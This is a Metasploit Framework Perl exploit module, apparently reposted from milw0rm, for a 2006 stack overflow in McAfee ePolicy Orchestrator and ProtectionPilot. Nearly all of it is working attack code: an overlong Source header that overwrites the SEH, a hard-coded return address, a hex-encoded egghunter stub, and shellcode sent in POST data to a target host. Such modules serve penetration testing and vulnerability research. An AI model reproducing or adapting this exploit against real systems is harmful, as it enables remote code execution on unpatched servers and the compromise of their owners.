##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::mcafee_epolicy_source;
use base "Msf::Exploit";
use strict;
use Pex::Text;
my $advanced = { };

my $info =
  {
	'Name'     => 'McAfee ePolicy Orchestrator / ProtPilot Source Overflow',
	'Version'  => '$Revision: 1.0 $',
	'Authors'  =>
	  [
		'muts <muts [at] remote-exploit.org>',
		'xbxice[at]yahoo.com',
		'H D Moore <hdm [at] metasploit.com>'
	  ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'win2003' ],
	'Priv'  => 0,

	'AutoOpts'  => { 'EXITFUNC' => 'thread' },
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 81],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		# Space is almost unlimited, but 1024 is fine for now
		'Space'     => 1024,
		'BadChars'  => "\x00\x09\x0a\x0b\x0d\x20\x26\x2b\x3d\x25\x8c\x3c\xff",
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
	This is a stack overflow exploit for McAfee ePolicy Orchestrator 3.5.0 
	and ProtectionPilot 1.1.0. Tested on Windows 2000 SP4 and Windows 2003 SP1.
	This module is based on the exploit by xbxice and muts.
}),

	'Refs'  =>
	  [
		['URL', 'http://www.remote-exploit.org/advisories/mcafee-epo.pdf' ],
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
		['Windows 2000/2003 ePo 3.5.0/ProtectionPilot 1.1.0', 96, 0x601EDBDA], # pop pop ret xmlutil.dll
	  ],

	'Keys' => ['epo'],

	'DisclosureDate' => 'Jul 17 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	# Use a egghunter stub to find the payload
	my $eggtag  = Pex::Text::AlphaNumText(4);
	my $egghunt =
	  "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02" .
	  "\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8" .
	  $eggtag .
	  "\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7";

	# Create the 64-byte GUID
	my $guid = Pex::Text::AlphaNumText(64);

	# Create the 260 byte Source header
	my $evil = Pex::Text::AlphaNumText(260);

	#
	# A long Source header results in a handful of exceptions.
	# The first exception occurs with a pointer at offset 116.
	# This exception occurs because a function pointer is
	# dereferenced from the overwritten data and then called:
	#  naisp32!naSPIPE_MainWorkFunc+0x3ed:
	#    mov ecx, [eax+0x270] (eax is offset 116)
	#    push ecx
	#    call [eax+0x26c]
	#
	# When this happens, the first SEH in the chain is also
	# overwritten at offset 96, so the exception results
	# in our code being called. If we knew of an address
	# in memory that pointed to our shellcode, we could
	# avoid the SEH completely and use the above call to
	# execute our code. This is actually practical, since
	# we can upload almost arbitrary amounts of data into
	# the heap and then overwrite the function pointer above.
	#
	# This method is left as an excercise to the reader.
	#
	# This module will use the SEH overwrite with a pop/pop/ret or
	# a jmp/call ebx (2000 only) to gain control of execution. This
	# removes the need for a large data upload and should result in
	# reliable execution without the need to brute force.
	#
	# Since the SEH method only leaves ~140 bytes of contiguous
	# shellcode space, we use an egghunter to find the real
	# payload that we stuffed into the heap as POST data.
	#

	# Trigger the exception by passing a bad pointer
	substr($evil, $target->[1] + 20, 4, Pex::Text::AlphaNumText(3)."\xff");

	# Return to pop/pop/ret or equivalent
	substr($evil, $target->[1], 4, pack('V', $target->[2]));

	# Jump to the egghunter
	substr($evil, $target->[1] - 4, 2, "\xeb\x1a");

	# Egghunter has 140 bytes of room to work
	substr($evil, $target->[1] + 24, length($egghunt), $egghunt);

	# Create our post data containing the shellcode
	my $data = Pex::Text::AlphaNumText(int(rand(500)+32));

	# Embed the search tag and shellcode
	$data .= ($eggtag x 2) . $shellcode;

	# Add some extra padding
	$data .=  Pex::Text::AlphaNumText(int(rand(500)+32));

	my $req = "GET /spipe/pkg HTTP/1.0\r\n";
	$req .="User-Agent: Mozilla/4.0 (compatible; SPIPE/1.0\r\n";
	$req .="Content-Length: ". length($data). "\r\n";
	$req .="AgentGuid=${guid}\r\n";
	$req .="Source=${evil}\r\n";
	$req .= "\r\n";
	$req .= $data;

	$self->PrintLine(sprintf("[*] Trying ".$target->[0]." using 0x%.8x...", $target->[2]));

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($req);

	$self->PrintLine("[*] Waiting up to two minutes for the egghunter...");
	$s->Recv(-1, 120);
	$self->Handler($s);
	$s->Close;
	return;
}

1;

# milw0rm.com [2006-10-01]
